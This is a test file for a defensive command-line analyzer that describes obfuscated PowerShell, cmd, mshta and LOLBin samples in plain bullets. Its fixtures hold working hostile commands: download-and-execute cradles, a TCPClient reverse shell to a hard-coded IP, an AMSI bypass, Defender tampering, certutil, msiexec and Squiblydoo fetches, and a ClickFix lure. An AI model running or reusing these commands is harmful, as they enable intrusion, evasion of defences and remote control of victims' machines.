// shared/analyzer/__tests__/bullets.test.ts
import { describe, expect, it } from 'vitest'
import { deriveBullets } from '../bullets'
import { buildContext } from '../techniques'
import { analyze } from '../report'
import { RULES as TECHNIQUE_RULES } from '../techniques'
import type { DecodedLayer, ExtractedIoc, Signal } from '../types'

function sig(id: string, overrides: Partial<Signal> = {}): Signal {
  return { id, label: id, techniqueIds: [], specificity: 'strong', trigger: id, ...overrides }
}

describe('deriveBullets — delivery family (SOC must-fix #1)', () => {
  it('a clickfix signal with an actual decoy phrase in the corpus fires the fake-verification-prompt bullet', () => {
    const ctx = buildContext('captcha — please verify you are human, then paste this in Win+R', [], 'powershell')
    const bullets = deriveBullets(ctx, [], [], [sig('clickfix')])
    expect(bullets.some((b) => b.text === 'Presents a fake human-verification prompt instructing the user to paste and run this command (ClickFix pattern)')).toBe(true)
  })

  it('a clickfix signal with NO decoy/headless text (the generic hidden+nop+fetch+IEX fallback) does NOT fire the delivery bullet', () => {
    // clickfix's own techniques.ts rule also fires on a bare hidden+nop+fetch+IEX
    // cradle with no literal verification prompt — asserting "presents a fake
    // human-verification prompt" there would be an invented fact. The delivery
    // bullet requires the actual decoy/headless discriminator, not just the signal.
    const ctx = buildContext("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')", [], 'powershell')
    const bullets = deriveBullets(ctx, [], [], [sig('clickfix')])
    expect(bullets.some((b) => b.text.includes('human-verification'))).toBe(false)
  })
})

describe('deriveBullets — decode/decompress family', () => {
  it('a fully-decoded -enc layer fires a resolved decode bullet', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Base64 → UTF-16LE', text: "IEX 'hi'", state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext("IEX 'hi'", [], 'powershell'), layers, [], [])
    const b = bullets.find((x) => x.text.includes('Base64 -EncodedCommand'))
    expect(b).toBeTruthy()
    expect(b!.confidence).toBe('resolved')
  })

  it('an opaque (malformed) -enc layer fires an opaque decode bullet, not resolved', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Base64 → UTF-16LE', text: null, state: 'opaque', residual: { bytes: 9, entropy: 0, note: 'malformed' } }]
    const bullets = deriveBullets(buildContext('', [], 'powershell'), layers, [], [])
    const b = bullets.find((x) => x.text.includes('malformed'))
    expect(b).toBeTruthy()
    expect(b!.confidence).toBe('opaque')
  })

  it('a Base64 → inflate layer fires a resolved decompress bullet', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Base64 → inflate', text: 'IEX x', state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext('IEX x', [], 'powershell'), layers, [], [])
    expect(bullets.some((b) => b.text.includes('Decompresses an embedded blob'))).toBe(true)
  })

  it('a Chr()/fromCharCode layer fires a resolved decode bullet', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Chr()/fromCharCode → text', text: 'Hi', state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext('Hi', [], 'mshta'), layers, [], [])
    expect(bullets.some((b) => b.text === 'Decodes Chr()/fromCharCode-encoded text')).toBe(true)
  })
})

describe('deriveBullets — interpreter-transition family (SOC must-fix #2: never assert "hidden" unconditionally)', () => {
  it('a cmd→powershell hop with NO -w flag resolved omits "(hidden window)"', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'cmd→powershell -enc', text: 'IEX x', state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext('IEX x', [], 'powershell'), layers, [], [])
    expect(bullets.some((b) => b.text === 'Launches a PowerShell child process from cmd.exe')).toBe(true)
    expect(bullets.some((b) => b.text.includes('hidden window'))).toBe(false)
  })

  it('a cmd→powershell hop WITH the -w flag resolved appends "(hidden window)"', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'cmd→powershell -enc', text: 'IEX x', state: 'fully-decoded' }]
    const ctx = buildContext('IEX x', [{ flag: '-w', raw: '-w hidden', techniqueIds: ['T1564.003'] }], 'powershell')
    const bullets = deriveBullets(ctx, layers, [], [])
    expect(bullets.some((b) => b.text === 'Launches a PowerShell child process from cmd.exe (hidden window)')).toBe(true)
  })

  it('an mshta-interpreter signal fires the mshta-execute bullet naming its trigger', () => {
    const signals = [sig('mshta-interpreter', { techniqueIds: ['T1218.005'], trigger: 'https://' })]
    const bullets = deriveBullets(buildContext('', [], 'mshta'), [], [], signals)
    expect(bullets.some((b) => b.text === 'Executes an mshta payload (https://)')).toBe(true)
  })

  it('a wsh-script-exec signal fires a language- and host-aware bullet', () => {
    const signals = [sig('wsh-script-exec', { techniqueIds: ['T1059.005'] })]
    const bullets = deriveBullets(buildContext('', [], 'wscript'), [], [], signals)
    expect(bullets.some((b) => b.text === 'Runs a vbs script via wscript')).toBe(true)
  })
})

describe('deriveBullets — fetch/execute family, resolved vs inferred, method-named (SOC must-fix #4)', () => {
  it('a resolved download-cradle URL names the download method (from the Signal.trigger, F2/F3) and the IOC', () => {
    const signals = [sig('download-cradle', { techniqueIds: ['T1059.001', 'T1105'], trigger: '.DownloadString' })]
    const iocs: ExtractedIoc[] = [{ raw: 'http://45.9.148.20/a.ps1', defanged: 'hxxp://45[.]9[.]148[.]20/a[.]ps1', type: 'url', layerIndex: 0 }]
    const ctx = buildContext("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')", [], 'powershell')
    const bullets = deriveBullets(ctx, [], iocs, signals)
    const b = bullets.find((x) => x.verb === 'Downloads')
    expect(b!.confidence).toBe('resolved')
    expect(b!.text).toBe('Downloads content from hxxp://45[.]9[.]148[.]20/a[.]ps1 via WebClient.DownloadString')
    expect(b!.iocs).toEqual(['http://45.9.148.20/a.ps1'])
    expect(bullets.some((x) => x.text.includes('Executes the downloaded content in memory'))).toBe(true)
  })

  it('names Invoke-WebRequest and BITS transfer when those are the resolved method (F2: derived from the Signal.trigger, not an independent re-scan)', () => {
    const iwrSignal = [sig('download-cradle', { trigger: 'Invoke-WebRequest' })]
    const iwr = deriveBullets(buildContext('Invoke-WebRequest http://x.test/a | IEX', [], 'powershell'), [], [], iwrSignal)
    expect(iwr.find((b) => b.verb === 'Downloads')!.text).toContain('via Invoke-WebRequest')
    const bitsSignal = [sig('download-cradle', { trigger: 'Start-BitsTransfer' })]
    const bits = deriveBullets(buildContext('Start-BitsTransfer -Source http://x.test/a ; IEX $x', [], 'powershell'), [], [], bitsSignal)
    expect(bits.find((b) => b.verb === 'Downloads')!.text).toContain('via BITS transfer')
  })

  it('an unresolved download-cradle target degrades to inferred, no IOC named', () => {
    const signals = [sig('download-cradle', { techniqueIds: ['T1059.001', 'T1105'], trigger: '' })]
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], signals)
    const b = bullets.find((x) => x.verb === 'Downloads')
    expect(b!.confidence).toBe('inferred')
    expect(b!.text).toBe('Downloads content from a URL assembled at runtime — not resolved')
  })

  it('a cmd-cradle signal fires the fetches-via-for/f bullet', () => {
    const signals = [sig('cmd-cradle', { techniqueIds: ['T1059.003', 'T1105'] })]
    const bullets = deriveBullets(buildContext('', [], 'cmd'), [], [], signals)
    expect(bullets.some((b) => b.text === 'Fetches a command via for /f or finger and executes its output')).toBe(true)
  })
})

describe('deriveBullets — per-LOLBin bullets off the generic lolbin signal (SOC must-fix #1)', () => {
  const LOLBIN_EXPECT: Record<string, string> = {
    certutil: 'Decodes/downloads a payload via certutil',
    bitsadmin: 'Fetches a file via bitsadmin/BITS transfer',
    regsvr32: 'Executes regsvr32 against a remote target',
    rundll32: 'Executes code via a rundll32 proxy invocation',
    wmic: 'Executes via wmic',
  }
  for (const [bin, text] of Object.entries(LOLBIN_EXPECT)) {
    it(`lolbin trigger "${bin}" fires its dedicated bullet`, () => {
      const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('lolbin', { trigger: bin })])
      expect(bullets.some((b) => b.text === text)).toBe(true)
    })
  }

  it('msiexec interpolates the resolved MSI URL, or degrades honestly when unresolved', () => {
    const iocs: ExtractedIoc[] = [{ raw: 'http://x.test/a.msi', defanged: 'hxxp://x[.]test/a[.]msi', type: 'url', layerIndex: 0 }]
    const resolved = deriveBullets(buildContext('', [], 'powershell'), [], iocs, [sig('lolbin', { trigger: 'msiexec' })])
    expect(resolved.some((b) => b.text === 'Installs from a remote MSI via msiexec /i hxxp://x[.]test/a[.]msi')).toBe(true)
    const unresolved = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('lolbin', { trigger: 'msiexec' })])
    expect(unresolved.some((b) => b.text.includes('URL not resolved'))).toBe(true)
  })

  it('a lolbin trigger for a binary with NO dedicated ActionRule (e.g. finger, mshta) fires no LOLBin-specific bullet', () => {
    // mshta already has its own mshta-execute rule off the mshta-interpreter
    // signal — a duplicate "LOLBin: mshta" bullet would double up the reveal.
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('lolbin', { trigger: 'mshta' })])
    expect(bullets).toHaveLength(0)
  })
})

describe('deriveBullets — evade family: split rules, no slash-hedge (SOC must-fix #3)', () => {
  it('amsi-reflection and amsi-memory-patch are independent rules that can BOTH fire', () => {
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('amsi-reflection'), sig('amsi-memory-patch')])
    expect(bullets.some((b) => b.text === 'Disables AMSI (script scanning) via reflection')).toBe(true)
    expect(bullets.some((b) => b.text === 'Disables AMSI via an in-memory patch (AmsiScanBuffer)')).toBe(true)
  })

  it('etw-tamper fires the ETW-blind bullet', () => {
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('etw-tamper')])
    expect(bullets.some((b) => b.text === 'Blinds ETW logging')).toBe(true)
  })

  it('defender-disable-rtm and defender-add-exclusion are independent rules that can BOTH fire, each naming only its own resolved sub-fact', () => {
    const both = deriveBullets(
      buildContext("Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\Users\\Public\\x'", [], 'powershell'),
      [], [], [sig('defender-tamper')],
    )
    expect(both.some((b) => b.text === 'Disables Microsoft Defender real-time monitoring')).toBe(true)
    expect(both.some((b) => b.text === "Adds a Microsoft Defender exclusion for C:\\Users\\Public\\x")).toBe(true)
    // never a combined "X / Y" hedge string
    expect(both.some((b) => b.text.includes(' / '))).toBe(false)
  })

  it('only the resolved evasion-cluster flags are named — never an unresolved one', () => {
    const twoFlags = deriveBullets(
      buildContext('', [{ flag: '-w', raw: '-w hidden', techniqueIds: [] }, { flag: '-nop', raw: '-nop', techniqueIds: [] }], 'powershell'),
      [], [], [sig('evasion-cluster')],
    )
    expect(twoFlags.find((b) => b.verb === 'Runs')!.text).toBe('Runs with evasion flags (hidden, no-profile)')
    expect(twoFlags.find((b) => b.verb === 'Runs')!.text).not.toContain('execution-policy bypass')
  })
})

describe('deriveBullets — inject/persist/beacon families', () => {
  it('fileless-loader fires the in-memory-injection bullet', () => {
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('fileless-loader')])
    expect(bullets.some((b) => b.text === 'Allocates executable memory and starts a thread on embedded shellcode (in-memory injection)')).toBe(true)
  })

  it('persistence names the mechanism from the resolved corpus', () => {
    const task = deriveBullets(buildContext('Register-ScheduledTask -TaskName evil', [], 'powershell'), [], [], [sig('persistence')])
    expect(task.find((b) => b.verb === 'Creates')!.text).toContain('a scheduled task')
    const run = deriveBullets(buildContext('reg add HKCU\\...\\CurrentVersion\\Run /v x', [], 'powershell'), [], [], [sig('persistence')])
    expect(run.find((b) => b.verb === 'Creates')!.text).toContain('an autostart Run-key')
    const wmi = deriveBullets(buildContext('__EventFilter ... CommandLineEventConsumer', [], 'powershell'), [], [], [sig('persistence')])
    expect(wmi.find((b) => b.verb === 'Creates')!.text).toContain('a WMI event subscription')
  })

  it('beaconing names a host resolved from a URL inside its own loop and, when the Start-Sleep interval resolves, appends "every ~{n}s" (F1: never the flat first IOC)', () => {
    const iocs: ExtractedIoc[] = [{ raw: 'http://45.9.148.20/beacon', defanged: 'hxxp://45[.]9[.]148[.]20/beacon', type: 'url', layerIndex: 0 }]
    const withInterval = deriveBullets(
      buildContext("while ($true) { Start-Sleep 30; IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/beacon') }", [], 'powershell'),
      [], iocs, [sig('beaconing')],
    )
    const b = withInterval.find((x) => x.verb === 'Beacons')
    expect(b!.confidence).toBe('resolved')
    expect(b!.text).toBe('Beacons to hxxp://45[.]9[.]148[.]20/beacon in a loop every ~30s')
    const noInterval = deriveBullets(
      buildContext("while ($true) { IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/beacon') }", [], 'powershell'),
      [], iocs, [sig('beaconing')],
    )
    expect(noInterval.find((x) => x.verb === 'Beacons')!.text).toBe('Beacons to hxxp://45[.]9[.]148[.]20/beacon in a loop')
  })

  it('beaconing degrades to an unnamed remote host when no URL resolves inside the loop — never names an unrelated IOC sitting elsewhere in the corpus (F1)', () => {
    const iocs: ExtractedIoc[] = [{ raw: '45.9.148.20', defanged: '45[.]9[.]148[.]20', type: 'ipv4', layerIndex: 0 }]
    const bullets = deriveBullets(buildContext('while ($true) { Start-Sleep 5; IEX $x }', [], 'powershell'), [], iocs, [sig('beaconing')])
    const b = bullets.find((x) => x.verb === 'Beacons')
    expect(b!.confidence).toBe('inferred')
    expect(b!.text).toBe('Beacons to a remote host in a loop every ~5s')
  })

  it('reverse-shell degrades to inferred with no parseable TCPClient construct', () => {
    const noHost = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('reverse-shell')])
    expect(noHost.find((b) => b.verb === 'Opens')!.confidence).toBe('inferred')
    expect(noHost.find((b) => b.verb === 'Opens')!.text).toBe('Opens a reverse shell to a remote endpoint')
  })

  it('reverse-shell resolves host:port from its own TCPClient construct, ignoring an unrelated IOC elsewhere in the corpus (F1)', () => {
    const iocs: ExtractedIoc[] = [{ raw: '11.11.11.11', defanged: '11[.]11[.]11[.]11', type: 'ipv4', layerIndex: 0 }]
    const bullets = deriveBullets(
      buildContext("(New-Object Net.Sockets.TCPClient('99.99.99.99',4444))", [], 'powershell'),
      [], iocs, [sig('reverse-shell')],
    )
    const b = bullets.find((x) => x.verb === 'Opens')
    expect(b!.confidence).toBe('resolved')
    expect(b!.text).toBe('Opens a reverse shell to 99[.]99[.]99[.]99:4444')
    expect(b!.text).not.toContain('11.11.11.11')
  })
})

describe('deriveBullets — WSH honesty signals quarantine to opaque', () => {
  it('wsh-decode-limits and wsh-concat-eval-present both render opaque-tier bullets', () => {
    const bullets = deriveBullets(buildContext('', [], 'wscript'), [], [], [sig('wsh-decode-limits'), sig('wsh-concat-eval-present')])
    expect(bullets).toHaveLength(2)
    expect(bullets.every((b) => b.confidence === 'opaque')).toBe(true)
  })
})

const ENC_CRADLE =
  'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='

describe('execution ordering (D2/D6, 11-tier): delivery → interpreter-transition → decode → evade → fetch → execute', () => {
  it('a -enc, hidden+no-profile download→IEX cradle orders decode, then evade, then fetch, then execute, with sequential order numbers', async () => {
    // -nop + -w + -enc = 3 evasion flags (cluster fires) AND -w+-nop+FETCH+IEX
    // (clickfix's own hiddenFetchIex branch fires too) — but clickfix-delivery
    // does NOT fire here (no decoy/headless text), so the ordering stays clean:
    // decode(4) < evade(6) < fetch(7) < execute(8).
    const r = await analyze('powershell -nop -w hidden -enc ' + ENC_CRADLE)
    const texts = r.bullets.map((b) => b.text)
    const decodeIdx = texts.findIndex((t) => t.includes('Base64 -EncodedCommand'))
    const evadeIdx = texts.findIndex((t) => t.startsWith('Runs with evasion flags'))
    const fetchIdx = texts.findIndex((t) => t.includes('Downloads content from'))
    const execIdx = texts.findIndex((t) => t.includes('Executes the downloaded content in memory'))
    expect(decodeIdx).toBeGreaterThanOrEqual(0)
    expect(evadeIdx).toBeGreaterThan(decodeIdx)
    expect(fetchIdx).toBeGreaterThan(evadeIdx)
    expect(execIdx).toBeGreaterThan(fetchIdx)
    expect(r.bullets.map((b) => b.order)).toEqual([1, 2, 3, 4])
    expect(texts.some((t) => t.includes('human-verification'))).toBe(false) // no delivery bullet: no decoy text present
  })

  it('a genuine ClickFix decoy fixture orders delivery FIRST, ahead of everything else', async () => {
    const r = await analyze("cmd.exe /c for /f %e in ('finger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue")
    expect(r.bullets[0].text).toBe('Presents a fake human-verification prompt instructing the user to paste and run this command (ClickFix pattern)')
  })
})

describe('banned-word discipline (D6, mirrors doctrine.ts, widened word list)', () => {
  const BANNED = /\b(malicious|attacker|likely|c2|backdoor|exploit|compromise|adversary|threat actor|hack)\b/i

  it('"payload" and "beacon" are allowed terms of art (used in spec §7\'s own example bullets), not banned', () => {
    expect('Executes an mshta payload (https://)').not.toMatch(BANNED)
    expect('Beacons to 45[.]9[.]148[.]20 in a loop').not.toMatch(BANNED)
  })

  it('no bullet emits a banned word across a representative fixture sweep', async () => {
    const fixtures = [
      'powershell -nop -w hidden -enc ' + ENC_CRADLE,
      "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')",
      "cmd.exe /c for /f %e in ('finger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue",
      "while ($true) { Start-Sleep 5; IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/beacon') }",
      'mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))',
      'Register-ScheduledTask -TaskName evil -Action (New-ScheduledTaskAction -Execute powershell)',
      "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\x'",
      'certutil -urlcache -f http://45.9.148.20/a.exe a.exe',
    ]
    for (const input of fixtures) {
      const r = await analyze(input)
      for (const b of r.bullets) expect(b.text).not.toMatch(BANNED)
    }
  })
})

describe('coverage discipline (D5/D6): every signal maps to a bullet', () => {
  const ALL_SIGNAL_IDS = [
    'download-cradle', 'cmd-cradle', 'evasion-cluster', 'amsi-reflection', 'amsi-memory-patch',
    'etw-tamper', 'defender-tamper', 'shadow-recovery-tamper', 'clickfix', 'beaconing', 'reverse-shell', 'fileless-loader',
    'persistence', 'lolbin', 'mshta-interpreter', 'wsh-script-exec', 'wsh-decode-limits', 'wsh-concat-eval-present',
  ]

  it('lists exactly the 18 signal ids defined in techniques.ts (fails loudly if the signal catalog changes without a matching bullets.ts update)', () => {
    expect(TECHNIQUE_RULES.map((r) => r.id).sort()).toEqual([...ALL_SIGNAL_IDS].sort())
  })

  it.each(ALL_SIGNAL_IDS)('signal "%s" yields at least one bullet when it fires', (id) => {
    const iocs: ExtractedIoc[] = [{ raw: '45.9.148.20', defanged: '45[.]9[.]148[.]20', type: 'ipv4', layerIndex: 0 }]
    if (id === 'clickfix') {
      const ctx = buildContext('captcha verify you are human', [], 'powershell')
      expect(deriveBullets(ctx, [], [], [sig('clickfix')]).length).toBeGreaterThan(0)
      return
    }
    if (id === 'lolbin') {
      const ctx = buildContext('', [], 'powershell')
      expect(deriveBullets(ctx, [], [], [sig('lolbin', { trigger: 'certutil' })]).length).toBeGreaterThan(0)
      return
    }
    if (id === 'defender-tamper') {
      const ctx = buildContext('Set-MpPreference -DisableRealtimeMonitoring $true', [], 'powershell')
      expect(deriveBullets(ctx, [], [], [sig('defender-tamper')]).length).toBeGreaterThan(0)
      return
    }
    const ctx = buildContext('Register-ScheduledTask', [], 'powershell') // corpus content only matters for persistence's mechanism-naming branch
    expect(deriveBullets(ctx, [], iocs, [sig(id)]).length).toBeGreaterThan(0)
  })
})

describe('opaque quarantine (D3/D6)', () => {
  it('WSH/HTA honesty bullets render at opaque tier, never resolved/inferred', async () => {
    const r = await analyze('wscript //E:vbscript C:\\Users\\Public\\payload.vbs')
    const honesty = r.bullets.filter((b) => b.text.includes('numeric char-code decode only') || b.text.includes('string-concat / eval'))
    expect(honesty.length).toBeGreaterThan(0)
    expect(honesty.every((b) => b.confidence === 'opaque')).toBe(true)
  })
})

describe('end-to-end fixture: finger/for-f cradle (D6)', () => {
  it('yields a single resolved fetch bullet naming the for-f/finger cradle', async () => {
    const r = await analyze("cmd /c for /f %e in ('finger user@45.9.148.20') do %e")
    expect(r.bullets).toHaveLength(1)
    expect(r.bullets[0].text).toBe('Fetches a command via for /f or finger and executes its output')
    expect(r.bullets[0].confidence).toBe('resolved')
  })
})

// ---- Whole-branch review regression fixtures (2026-08-19) ----
// All four findings below only surface on composed multi-fact real input
// (through analyze() end to end) — which is exactly why the per-task reviews
// missed them; each isolated ActionRule looked correct on its own.
describe('whole-branch review regressions (2026-08-19)', () => {
  it('F1 CRITICAL: per-behavior host attribution — a two-host sample never lets one behavior name another behavior\'s host', async () => {
    // A download cradle pulling from 11.11.11.11, and a SEPARATE reverse shell
    // (with the GetStream()/Read() discriminator techniques.ts's reverse-shell
    // rule requires) connecting to 99.99.99.99:4444. Before the fix, every
    // host-naming bullet used the first host IOC in the whole flat list —
    // the reverse-shell bullet named 11.11.11.11 (the download URL) and never
    // mentioned 99.99.99.99, and the port was dropped entirely.
    const input =
      "IEX (New-Object Net.WebClient).DownloadString('http://11.11.11.11/stage2.ps1'); " +
      "$client = New-Object Net.Sockets.TCPClient('99.99.99.99',4444); $stream = $client.GetStream(); " +
      '[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){' +
      '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); IEX $data}'
    const r = await analyze(input)

    const download = r.bullets.find((b) => b.verb === 'Downloads')
    const reverseShell = r.bullets.find((b) => b.verb === 'Opens')
    expect(download).toBeTruthy()
    expect(reverseShell).toBeTruthy()

    expect(download!.text).toContain('11[.]11[.]11[.]11')
    // the download bullet must never pick up the reverse-shell's host either
    expect(download!.text).not.toContain('99.99.99.99')

    // the reverse-shell bullet must name ITS OWN host:port — 99.99.99.99:4444 —
    // and must NEVER contain 11.11.11.11 (the download URL's host)
    expect(reverseShell!.text).toBe('Opens a reverse shell to 99[.]99[.]99[.]99:4444')
    expect(reverseShell!.text).not.toContain('11.11.11.11')
    expect(reverseShell!.iocs).toEqual(['99.99.99.99'])
  })

  it('F2 MAJOR: download method is derived from the download-cradle Signal.trigger, not an independent corpus re-scan (a commented-out Start-BitsTransfer must not out-rank the real DownloadString construct)', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a'); # Start-BitsTransfer -Source http://x.test/a")
    const b = r.bullets.find((x) => x.verb === 'Downloads')
    expect(b).toBeTruthy()
    expect(b!.text).toContain('WebClient.DownloadString')
    expect(b!.text).not.toContain('BITS transfer')
  })

  it('F3 MAJOR: a resolved-URL construct with a position-0 irm/iwr trigger resolves the method and is NEVER rendered as "assembled at runtime"', async () => {
    const r = await analyze('irm http://45.9.148.20/a.ps1 | iex')
    const b = r.bullets.find((x) => x.verb === 'Downloads')
    expect(b).toBeTruthy()
    expect(b!.confidence).toBe('resolved')
    expect(b!.iocs).toContain('http://45.9.148.20/a.ps1')
    expect(b!.text).toContain('hxxp://45[.]9[.]148[.]20/a[.]ps1')
    expect(b!.text).not.toContain('assembled at runtime')
  })

  it('F4 MAJOR: no bullet renders literal Markdown (** or a backtick) across a representative fixture sweep — ActionBullets.tsx renders {b.text} as plain text, not through a markdown parser', async () => {
    const fixtures = [
      'powershell -nop -w hidden -enc ' + ENC_CRADLE,
      "IEX (New-Object Net.WebClient).DownloadString('http://11.11.11.11/stage2.ps1'); " +
        "$client = New-Object Net.Sockets.TCPClient('99.99.99.99',4444); $stream = $client.GetStream(); " +
        '[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){' +
        '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); IEX $data}',
      "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')",
      "cmd.exe /c for /f %e in ('finger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue",
      "while ($true) { Start-Sleep 5; IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/beacon') }",
      'mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))',
      'Register-ScheduledTask -TaskName evil -Action (New-ScheduledTaskAction -Execute powershell)',
      "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\x'",
      'certutil -urlcache -f http://45.9.148.20/a.exe a.exe',
      'wscript //E:vbscript C:\\Users\\Public\\payload.vbs',
      "msiexec /i http://45.9.148.20/a.msi",
      'irm http://45.9.148.20/a.ps1 | iex',
    ]
    for (const input of fixtures) {
      const r = await analyze(input)
      for (const b of r.bullets) {
        expect(b.text).not.toContain('**')
        expect(b.text).not.toContain('`')
      }
    }
  })

  it('F1 follow-up (scoped re-review): beacon-loop never names a host that sits textually AFTER the loop\'s closing brace, even when it falls inside the naive ~400-char window', async () => {
    // A while/Start-Sleep loop with an EMPTY body, followed by an unrelated
    // download-cradle URL just past the closing brace — well within 400 chars
    // of the literal "while". Before this fix, beaconLoopHost() scanned a
    // flat forward window with no brace-awareness and picked up this
    // out-of-body URL, misattributing the download's host to the beacon —
    // the same cross-behavior misattribution class as F1.
    const input = "while ($true) { Start-Sleep -Seconds 30 } ; IEX (New-Object Net.WebClient).DownloadString('http://11.11.11.11/x.ps1')"
    const r = await analyze(input)
    const beacon = r.bullets.find((b) => b.verb === 'Beacons')
    expect(beacon).toBeTruthy()
    expect(beacon!.text).not.toContain('11.11.11.11')
    // either a genuinely in-body host (none here) or the unnamed degrade form
    expect(beacon!.text).toBe('Beacons to a remote host in a loop every ~30s')
    expect(beacon!.confidence).toBe('inferred')
  })

  it('SOC-1 (output-quality pass): the mshta entry vector leads the narrative even after nested-reentry reassigns ctx.interpreter to the final resolved value, with no spurious wscript bullet', async () => {
    // report.ts's nested-reentry loop reassigns `interpreter` to the FINAL
    // resolved value (here 'powershell') by the time deriveBullets runs, so
    // the mshta-interpreter SIGNAL (gated on ctx.interpreter === 'mshta')
    // never fires — the narrative used to start cold at the decode bullet and
    // never named mshta as the entry vector.
    const input = 'mshta vbscript:CreateObject("Wscript.Shell").Run("powershell -w hidden -enc c2xlZXAgMQ==")'
    const r = await analyze(input)
    const mshtaIdx = r.bullets.findIndex((b) => b.text.startsWith('Executes an mshta payload'))
    const decodeIdx = r.bullets.findIndex((b) => b.text.includes('Base64 -EncodedCommand'))
    expect(mshtaIdx).toBe(0)
    expect(decodeIdx).toBeGreaterThan(mshtaIdx)
    // preprocess()'s embedded-launcher fallback can mistake the `Wscript.Shell`
    // COM ProgID for a real wscript.exe launcher, producing an artifact
    // `wscript→powershell` hop — must not surface as a spurious wsh bullet.
    expect(r.bullets.some((b) => b.text.includes('script via wscript') || b.text.includes('script via cscript'))).toBe(false)
  })

  it('SOC-2 (output-quality pass): beacon-loop names a raw-socket host already in the IOC catalog, scoped to the loop body', async () => {
    const input = "while($true){ Start-Sleep 30; (New-Object Net.Sockets.TCPClient('99.99.99.99',4444)) }"
    const r = await analyze(input)
    const beacon = r.bullets.find((b) => b.verb === 'Beacons')
    expect(beacon).toBeTruthy()
    expect(beacon!.confidence).toBe('resolved')
    expect(beacon!.text).toContain('99[.]99[.]99[.]99')
    expect(beacon!.iocs).toContain('99.99.99.99')
  })

  it('SOC-3 (output-quality pass): the evasion-cluster bullet reads as a full clause, not a dropped one', async () => {
    const r = await analyze('powershell -nop -w hidden -enc ' + ENC_CRADLE)
    const evade = r.bullets.find((b) => b.verb === 'Runs')
    expect(evade).toBeTruthy()
    expect(evade!.text).toBe('Runs with evasion flags (hidden, no-profile)')
  })
})

describe('LOLBin narrative no-invent (review 2.3, sample 7)', () => {
  it('benign regsvr32 /u produces NO regsvr32 bullet', async () => {
    const r = await analyze('regsvr32 /u /s C:\\Program Files\\MyApp\\shell-extension.dll')
    expect(r.bullets.some((b) => /regsvr32/i.test(b.text))).toBe(false)
  })
  it('real Squiblydoo produces the Squiblydoo bullet', async () => {
    const r = await analyze('regsvr32 /s /n /u /i:http://evil.test/a.sct scrobj.dll')
    expect(r.bullets.some((b) => /squiblydoo/i.test(b.text))).toBe(true)
  })
})
